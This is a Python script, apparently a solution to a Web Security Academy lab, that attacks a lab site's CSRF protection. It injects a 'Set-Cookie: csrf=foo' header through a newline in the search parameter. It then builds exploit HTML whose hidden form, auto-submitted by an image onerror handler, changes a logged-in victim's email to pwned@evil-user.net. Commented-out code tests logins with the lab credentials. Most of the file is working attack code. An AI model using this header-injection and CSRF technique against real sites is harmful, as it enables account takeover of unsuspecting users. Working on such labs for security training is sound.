import requests
from bs4 import BeautifulSoup

site = 'ac861ff51e64ccc6c0b07e8600fa007c.web-security-academy.net'

s = requests.Session()

# def getHeadersFromSearch(search_term):
#     resp = requests.get(f"https://{site}/?search={search_term}")
#     for header in resp.headers.items():
#         print(header)

# # getHeadersFromSearch("elafleur")
# # getHeadersFromSearch("elafleur\nfoo: bar")
# getHeadersFromSearch("elafleur\nSet-Cookie: foo=bar")

# s = requests.Session()
# login_url = f'https://{site}/login'
# resp = s.get(login_url)
# soup = BeautifulSoup(resp.text,'html.parser')
# csrf = soup.find('input', {'name':'csrf'}).get('value')
# print(f' csrf field in form field: {csrf}')
# for header in resp.headers.items():
#     print(header)
# for cookie in s.cookies.items():
#     print(cookie)
# s.cookies.clear()
# logindata = {
#     'csrf' : csrf,
#     'username' : 'wiener',
#     'password' : 'peter'
# }
# resp = s.post(login_url, data=logindata)
# print(f"HTTP status code {resp.status_code} with text {resp.text}")
# logindata = {
#     'csrf' : csrf,
#     'username' : 'wiener',
#     'password' : 'peter'
# }
# cookiedata = {
#     'csrf' : csrf
# }
# resp = requests.post(login_url, data=logindata, cookies=cookiedata)
# print(f"HTTP status code {resp.status_code}")
# soup = BeautifulSoup(resp.text,'html.parser')
# csrf = soup.find('input', {'name':'csrf'}).get('value')
# print(f"CSRF token in HTML response is {csrf}")

import urllib
login_url = f'https://{site}/login'
change_email_url = f'https://{site}/my-account/change-email'
search_term = urllib.parse.quote("elafleur\nSet-Cookie: csrf=foo")
search_url = f'https://{site}/?search={search_term}'
print(f'URL to embed ({search_url})')

# exploit_html = f'''
#     <form action="{login_url}" method="POST">
#     <input type="hidden" name="username" value="wiener">
#     <input type="hidden" name="password" value="peter">
#     <input type="hidden" name="csrf" value="foo">
#     </form>
#     <img src="{search_url}" onerror="document.forms[0].submit();">
# '''

exploit_html = f'''
    <form action="{change_email_url}" method="POST">
    <input type="hidden" name="email" value="pwned@evil-user.net">
    <input type="hidden" name="csrf" value="foo">
    </form>
    <img src="{search_url}"
    onerror="document.forms[0].submit();">
'''